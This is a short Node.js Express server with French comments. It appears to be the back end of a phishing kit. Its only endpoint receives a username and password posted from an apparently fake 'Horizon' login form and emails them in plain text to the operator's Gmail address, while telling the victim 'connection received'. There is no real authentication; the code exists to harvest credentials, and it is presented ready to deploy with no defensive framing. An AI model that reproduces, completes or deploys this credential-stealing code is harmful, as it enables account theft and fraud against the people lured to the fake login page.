const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const cors = require('cors');
const app = express();
const PORT = 3000;

app.use(cors());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.post('/send-mail', async (req, res) => {
  const { username, password } = req.body;

  const transporter = nodemailer.createTransport({
    service: 'gmail', // ou autre (Outlook, Yahoo...)
    auth: {
      user: 'TON_ADRESSE_EMAIL@gmail.com',
      pass: 'TON_MOT_DE_PASSE_APP' // mot de passe d'application recommandé
    }
  });

  const mailOptions = {
    from: '"Horizon App" <TON_ADRESSE_EMAIL@gmail.com>',
    to: 'TON_ADRESSE_EMAIL@gmail.com',
    subject: 'Nouvelle tentative de connexion Horizon',
    text: `📥 Identifiants reçus :\n\n👤 Utilisateur : ${username}\n🔑 Mot de passe : ${password}`
  };

  try {
    await transporter.sendMail(mailOptions);
    res.send("Connexion reçue.");
  } catch (err) {
    console.error(err);
    res.status(500).send("Erreur d'envoi.");
  }
});

app.listen(PORT, () => {
  console.log(`✅ Serveur Horizon en ligne sur http://localhost:${PORT}`);
});
    